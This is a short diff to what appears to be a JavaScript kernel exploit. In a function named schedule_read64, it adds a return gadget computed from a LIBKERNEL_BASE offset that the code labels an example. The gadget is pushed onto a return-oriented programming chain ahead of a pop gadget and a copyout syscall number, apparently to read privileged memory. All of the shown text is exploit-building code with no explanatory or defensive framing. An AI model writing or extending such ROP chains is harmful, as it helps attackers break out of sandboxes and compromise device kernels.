@@ -11,6 +11,9 @@ function schedule_read64(addr) {
 
   const SYSCALL_COPYOUT = 0x3B;
   const USER_BUF_ADDR = 0x133713370300;
+  const GADGET_RET = LIBKERNEL_BASE + 0x1A2000; // example
+  
+  ropChain[i++] = GADGET_RET & 0xFFFFFFFF;
 
   ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
   ropChain[i++] = SYSCALL_COPYOUT;
